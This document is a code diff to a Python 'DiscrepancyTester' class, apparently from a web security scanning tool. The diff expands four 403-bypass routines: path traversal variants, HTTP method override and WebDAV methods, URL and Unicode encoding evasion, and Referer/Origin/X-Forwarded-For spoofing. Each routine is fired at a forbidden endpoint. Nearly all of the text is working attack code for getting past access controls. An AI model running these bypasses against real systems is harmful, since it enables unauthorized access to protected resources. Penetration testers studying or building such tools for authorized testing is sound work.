@@ -4401,63 +4401,366 @@ class DiscrepancyTester:
         }
 
     def _execute_path_traversal(self) -> Dict:
-        """Execute path traversal technique"""
-        try:
-            self.rate_limiter.wait()
-            test_path = self.parsed_url.path.replace('/', '//')
-            response = self.session.get(
-                f"{self.target_url}{test_path}",
-                timeout=5
+        """
+        Execute path traversal technique using discovered discrepancies
+
+        Strategy:
+        1. Use path variants from discovered "Path Normalization" discrepancies
+        2. Try multiple common path traversal techniques
+        3. Fallback to generic path manipulation
+        """
+        # First, try path variants from discovered discrepancies
+        path_discrepancies = [
+            d for d in self.discrepancies
+            if d.get('type') == 'Path Normalization'
+        ]
+
+        if path_discrepancies:
+            # Sort by severity
+            severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
+            path_discrepancies.sort(
+                key=lambda x: severity_order.get(x.get('severity', 'LOW'), 99)
             )
-            success = response.status_code not in [401, 403, 429]
-            return {'success': success, 'status_code': response.status_code}
-        except:
-            return {'success': False}
+
+            # Try top 3 discovered path variants
+            for discrepancy in path_discrepancies[:3]:
+                try:
+                    self.rate_limiter.wait()
+
+                    variant = discrepancy.get('variant', '')
+                    if not variant:
+                        continue
+
+                    # Build URL with the variant that worked
+                    test_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}{variant}"
+
+                    response = self.session.get(test_url, timeout=5)
+
+                    if response.status_code not in [401, 403, 429]:
+                        return {
+                            'success': True,
+                            'status_code': response.status_code,
+                            'method': 'discrepancy_path',
+                            'path_used': variant
+                        }
+
+                except Exception as e:
+                    continue
+
+        # Fallback: Try common path traversal techniques
+        base_path = self.parsed_url.path
+        common_path_variants = [
+            base_path.replace('/', '//'),           # Double slash
+            base_path.replace('/', '/./'),          # Dot segments
+            base_path + '/',                        # Trailing slash
+            base_path.rstrip('/'),                  # Remove trailing slash
+            base_path.replace('/', '/%2e/'),        # Encoded dot
+            base_path.replace('/', '/;/'),          # Semicolon bypass
+            urllib.parse.quote(base_path, safe=''), # Full URL encoding
+            base_path.replace('/', '/%09/'),        # Tab character
+        ]
+
+        for variant_path in common_path_variants:
+            try:
+                self.rate_limiter.wait()
+
+                test_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}{variant_path}"
+                response = self.session.get(test_url, timeout=5)
+
+                if response.status_code not in [401, 403, 429]:
+                    return {
+                        'success': True,
+                        'status_code': response.status_code,
+                        'method': 'common_path_variant',
+                        'path_used': variant_path
+                    }
+
+            except Exception as e:
+                continue
+
+        # All attempts failed
+        return {
+            'success': False,
+            'status_code': 403,
+            'attempts': len(path_discrepancies) + len(common_path_variants),
+            'message': 'All path traversal attempts failed'
+        }
 
     def _execute_method_override(self) -> Dict:
-        """Execute method override technique"""
-        try:
-            self.rate_limiter.wait()
-            response = self.session.post(
-                self.forbidden_endpoint,
-                headers={'X-HTTP-Method-Override': 'GET'},
-                timeout=5
+        """
+        Execute method override technique using discovered discrepancies
+
+        Strategy:
+        1. Use methods from discovered "Method Confusion" discrepancies
+        2. Try multiple HTTP method override techniques
+        3. Fallback to common method override headers
+        """
+        # First, try methods from discovered discrepancies
+        method_discrepancies = [
+            d for d in self.discrepancies
+            if d.get('type') == 'Method Confusion'
+        ]
+
+        if method_discrepancies:
+            # Sort by severity
+            severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
+            method_discrepancies.sort(
+                key=lambda x: severity_order.get(x.get('severity', 'LOW'), 99)
             )
-            success = response.status_code not in [401, 403, 429]
-            return {'success': success, 'status_code': response.status_code}
-        except:
-            return {'success': False}
+
+            # Try top 3 discovered methods
+            for discrepancy in method_discrepancies[:3]:
+                try:
+                    self.rate_limiter.wait()
+
+                    method = discrepancy.get('method', 'GET')
+                    if not method:
+                        continue
+
+                    # Use the method that worked in discrepancy test
+                    response = self.session.request(
+                        method=method,
+                        url=self.forbidden_endpoint,
+                        timeout=5
+                    )
+
+                    if response.status_code not in [401, 403, 405, 429]:
+                        return {
+                            'success': True,
+                            'status_code': response.status_code,
+                            'method': 'discrepancy_method',
+                            'http_method': method
+                        }
+
+                except Exception as e:
+                    continue
+
+        # Fallback: Try common method override techniques
+        method_override_tests = [
+            # Header-based method override
+            ('POST', {'X-HTTP-Method-Override': 'GET'}),
+            ('POST', {'X-Method-Override': 'GET'}),
+            ('POST', {'X-HTTP-Method': 'GET'}),
+            # Alternative methods
+            ('HEAD', {}),
+            ('OPTIONS', {}),
+            ('TRACE', {}),
+            # WebDAV methods
+            ('PROPFIND', {}),
+            ('PROPPATCH', {}),
+        ]
+
+        for method, headers in method_override_tests:
+            try:
+                self.rate_limiter.wait()
+
+                response = self.session.request(
+                    method=method,
+                    url=self.forbidden_endpoint,
+                    headers=headers,
+                    timeout=5
+                )
+
+                if response.status_code not in [401, 403, 405, 429]:
+                    return {
+                        'success': True,
+                        'status_code': response.status_code,
+                        'method': 'common_method_override',
+                        'http_method': method,
+                        'headers_used': list(headers.keys()) if headers else []
+                    }
+
+            except Exception as e:
+                continue
+
+        # All attempts failed
+        return {
+            'success': False,
+            'status_code': 403,
+            'attempts': len(method_discrepancies) + len(method_override_tests),
+            'message': 'All method override attempts failed'
+        }
 
     def _execute_encoding_evasion(self) -> Dict:
-        """Execute encoding evasion technique"""
-        try:
-            self.rate_limiter.wait()
-            encoded_path = urllib.parse.quote(self.parsed_url.path, safe='')
-            response = self.session.get(
-                f"{self.target_url}{encoded_path}",
-                timeout=5
+        """
+        Execute encoding evasion technique using discovered discrepancies
+
+        Strategy:
+        1. Use encodings from discovered "Encoding Confusion" discrepancies
+        2. Try multiple encoding techniques
+        3. Fallback to common encoding variations
+        """
+        # First, try encodings from discovered discrepancies
+        encoding_discrepancies = [
+            d for d in self.discrepancies
+            if d.get('type') == 'Encoding Confusion'
+        ]
+
+        if encoding_discrepancies:
+            # Sort by severity
+            severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
+            encoding_discrepancies.sort(
+                key=lambda x: severity_order.get(x.get('severity', 'LOW'), 99)
             )
-            success = response.status_code not in [401, 403, 429]
-            return {'success': success, 'status_code': response.status_code}
-        except:
-            return {'success': False}
+
+            # Try top 3 discovered encoding variants
+            for discrepancy in encoding_discrepancies[:3]:
+                try:
+                    self.rate_limiter.wait()
+
+                    encoded_variant = discrepancy.get('encoded_variant', '')
+                    if not encoded_variant:
+                        continue
+
+                    # Build URL with the encoding that worked
+                    test_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}{encoded_variant}"
+
+                    response = self.session.get(test_url, timeout=5)
+
+                    if response.status_code not in [401, 403, 429]:
+                        return {
+                            'success': True,
+                            'status_code': response.status_code,
+                            'method': 'discrepancy_encoding',
+                            'encoding_used': encoded_variant
+                        }
+
+                except Exception as e:
+                    continue
+
+        # Fallback: Try common encoding techniques
+        base_path = self.parsed_url.path
+        common_encodings = [
+            urllib.parse.quote(base_path, safe=''),                    # Full URL encoding
+            urllib.parse.quote(base_path, safe='/'),                   # Encode non-slash
+            urllib.parse.quote(urllib.parse.quote(base_path, safe='')), # Double encoding
+            base_path.replace('/', '%2f'),                             # Encode slash
+            base_path.replace('/', '%252f'),                           # Double-encode slash
+            base_path.replace(' ', '%20'),                             # Encode spaces
+            base_path.replace(' ', '+'),                               # Plus encoding
+            # Unicode variations
+            base_path.replace('/', '\u2044'),                          # Unicode slash
+            base_path.replace('/', '\uff0f'),                          # Fullwidth slash
+            # Mixed encodings
+            base_path.replace('/', '/%2F'),                            # Mixed case
+        ]
+
+        for encoded_path in common_encodings:
+            try:
+                self.rate_limiter.wait()
+
+                test_url = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}{encoded_path}"
+                response = self.session.get(test_url, timeout=5)
+
+                if response.status_code not in [401, 403, 429]:
+                    return {
+                        'success': True,
+                        'status_code': response.status_code,
+                        'method': 'common_encoding',
+                        'encoding_used': encoded_path
+                    }
+
+            except Exception as e:
+                continue
+
+        # All attempts failed
+        return {
+            'success': False,
+            'status_code': 403,
+            'attempts': len(encoding_discrepancies) + len(common_encodings),
+            'message': 'All encoding evasion attempts failed'
+        }
 
     def _execute_referer_spoofing(self) -> Dict:
-        """Execute referer/origin spoofing technique"""
-        try:
-            self.rate_limiter.wait()
-            response = self.session.get(
-                self.forbidden_endpoint,
-                headers={
-                    'Referer': f"{self.parsed_url.scheme}://{self.parsed_url.netloc}/",
-                    'Origin': f"{self.parsed_url.scheme}://{self.parsed_url.netloc}"
-                },
-                timeout=5
-            )
-            success = response.status_code not in [401, 403, 429]
-            return {'success': success, 'status_code': response.status_code}
-        except:
-            return {'success': False}
+        """
+        Execute referer/origin spoofing technique
+
+        Strategy:
+        1. Try multiple referer/origin combinations
+        2. Include same-origin, localhost, and internal IP variations
+        3. Test with and without additional headers
+        """
+        # Multiple referer/origin combinations to try
+        base_origin = f"{self.parsed_url.scheme}://{self.parsed_url.netloc}"
+
+        referer_tests = [
+            # Same origin (most common bypass)
+            {
+                'Referer': f"{base_origin}/",
+                'Origin': base_origin
+            },
+            # Localhost variations
+            {
+                'Referer': 'http://localhost/',
+                'Origin': 'http://localhost'
+            },
+            {
+                'Referer': 'http://127.0.0.1/',
+                'Origin': 'http://127.0.0.1'
+            },
+            # Internal IP ranges
+            {
+                'Referer': 'http://192.168.1.1/',
+                'Origin': 'http://192.168.1.1'
+            },
+            {
+                'Referer': 'http://10.0.0.1/',
+                'Origin': 'http://10.0.0.1'
+            },
+            # Referer only (no Origin)
+            {
+                'Referer': f"{base_origin}/"
+            },
+            # Origin only (no Referer)
+            {
+                'Origin': base_origin
+            },
+            # With additional spoofing headers
+            {
+                'Referer': f"{base_origin}/",
+                'Origin': base_origin,
+                'X-Forwarded-For': '127.0.0.1',
+                'X-Real-IP': '127.0.0.1'
+            },
+            # Null origin (CORS bypass)
+            {
+                'Origin': 'null'
+            },
+            # Arbitrary trusted domains (common misconfigurations)
+            {
+                'Referer': 'https://www.google.com/',
+                'Origin': 'https://www.google.com'
+            }
+        ]
+
+        for headers in referer_tests:
+            try:
+                self.rate_limiter.wait()
+
+                response = self.session.get(
+                    self.forbidden_endpoint,
+                    headers=headers,
+                    timeout=5
+                )
+
+                if response.status_code not in [401, 403, 429]:
+                    return {
+                        'success': True,
+                        'status_code': response.status_code,
+                        'method': 'referer_spoofing',
+                        'headers_used': list(headers.keys())
+                    }
+
+            except Exception as e:
+                continue
+
+        # All attempts failed
+        return {
+            'success': False,
+            'status_code': 403,
+            'attempts': len(referer_tests),
+            'message': 'All referer/origin spoofing attempts failed'
+        }
 
 
 class BypassGenerator:
